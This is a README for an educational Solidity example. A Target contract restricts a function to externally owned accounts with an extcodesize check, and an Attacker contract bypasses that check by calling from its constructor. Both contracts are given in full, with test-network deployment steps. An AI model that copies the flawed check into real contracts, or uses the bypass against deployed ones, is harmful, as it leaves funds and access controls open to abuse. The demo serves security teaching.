# Attack Example: Bypassing Contract Check in Solidity

This folder contains an example of how to bypass a contract check in Solidity. 
The example demonstrates a common security vulnerability where a contract attempts to restrict function access 
to only externally owned accounts (EOAs) and shows how this restriction can be circumvented.

## Files

- **Target.sol**: The contract containing the protected function that only EOAs can call.
- **TryAttack.sol**: A contract demonstrating a failed attempt to call the protected function.
- **Attacker.sol**: A contract demonstrating a successful method to bypass the EOA check.

## Contracts Overview

### Target Contract

The `Target` contract includes:
- A `passed` boolean variable to indicate if the protected function was called successfully.
- An `isContract` function to check if an address belongs to a contract.
- A `autorizationToPass` function that only EOAs can call. If a contract calls this function, the call will fail.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract Target {
    bool public passed; 

    function isContract(address _account) public view returns (bool) {
        uint256 length;
        assembly {
            length := extcodesize(_account) 
        }
        return length > 0; 
    }

    function autorizationToPass() external {
        require(!isContract(msg.sender), "No contract autorizationToPass!");
        passed = true; 
    }
}
```

### TryAttack Contract

The `TryAttack` contract demonstrates an unsuccessful attempt to call the `autorizationToPass` function in the `Target` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract TryAttack {
    function tryPass(address _target) external {
        Target(_target).autorizationToPass();
    }
}
```

### Attacker Contract

The `Attacker` contract successfully bypasses the `isContract` check in the `Target` contract. It does so by calling the `autorizationToPass` function during its constructor execution, at which point the `extcodesize` is zero.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract Attacker {
    bool public isContract; 
    address public account; 

    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        account = address(this);
        Target(_target).autorizationToPass();
    }
}
```

## Usage

1. **Deploy the `Target` Contract**: Deploy the `Target` contract on your preferred Ethereum test network.

2. **Attempt the Attack with `TryAttack` Contract**:
    - Deploy the `TryAttack` contract.
    - Attempt to call the `tryPass` function with the address of the `Target` contract.
    - The call will fail, demonstrating that the `autorizationToPass` function cannot be called by another contract directly.

3. **Successful Attack with `Attacker` Contract**:
    - Deploy the `Attacker` contract, passing the address of the `Target` contract to its constructor.
    - The `Attacker` contract will successfully call the `autorizationToPass` function during its creation, bypassing the contract check.

## Conclusion

This example illustrates how a contract can be vulnerable to attacks that bypass restrictions meant to limit function access to EOAs. 
The `Attacker` contract demonstrates a common technique where the `extcodesize` check can be circumvented during the contract's construction phase. Proper security measures should be implemented to mitigate such vulnerabilities.

## Author

- **Yaghoub Adelzadeh**
- **GitHub**: [dappteacher](https://www.github.com/dappteacher)

## License

This project is licensed under the MIT License.
```

This README provides a clear and comprehensive overview of the contracts, their purposes, and how to use them 
to understand the attack example.
